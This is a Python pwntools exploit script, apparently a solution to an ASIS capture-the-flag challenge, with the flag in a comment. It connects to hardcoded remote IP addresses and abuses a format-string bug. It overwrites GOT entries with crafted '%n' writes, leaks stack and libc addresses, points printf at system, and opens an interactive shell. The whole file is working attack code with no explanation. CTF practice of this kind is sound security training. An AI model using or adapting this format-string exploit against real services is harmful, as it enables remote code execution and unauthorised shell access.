#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 8888
#host = "146.185.168.172"
#ASIS{There_is_a_road_What_w3_Ca11_1t_D0ng_Fang}
host= "178.62.249.106"
port = 54515


def fmtchar(prev_word,word,index,byte = 1):
    fmt = ""
    if word - prev_word > 0 :
        result = word - prev_word 
        fmt += "%" + str(result) + "c"
    elif word == prev_word :
        result = 0
    else :
        result = 256**byte - prev_word + word
        fmt += "%" + str(result) + "c"
    if byte == 2 :
        fmt += "%" + str(index) + "$hn"
    elif byte == 4 :
        fmt += "%" + str(index) + "$n"
    else :
        fmt += "%" + str(index) + "$hhn"
    return fmt

r = remote(host,port)
r.recvuntil("2010")
print_got = 0x601028
fail_got = 0x601020
main = 0x4006da
context.arch ="amd64"
payload = ""
prev = 0

payload += fmtchar(prev,0x6,13)
prev = 6
payload += fmtchar(prev, 0xda00 ,14,2)
payload += "%20$p#%23$p#%16$n"
payload = payload.ljust(40,"a") + p64(fail_got+1) + p64(fail_got-1)[:7]


r.recvuntil("\n")

r.sendline(payload)
r.recvuntil("\x90")
stack =  int(r.recvuntil("#")[:-1],16)
print "stack:",hex(stack)
libc = int(r.recvuntil("#")[:-1],16) - 0x20830
print "libc:",hex(libc)
canary_addr = stack - 0x178
r.recvuntil("2010")
payload = ""
system = libc + 0x45390
prev = 0
for i in range(3):
    payload += fmtchar(prev,(system >> 8*i) & 0xff,16+i)
    prev = (system >> 8*i) & 0xff
payload += "%19$n"
p = p64(print_got) + p64(print_got+1) + p64(print_got+2) + p64(canary_addr)
payload = payload.ljust(64,"a") + p
r.sendline(payload)
r.sendline("sh\x00\x00")
r.interactive()
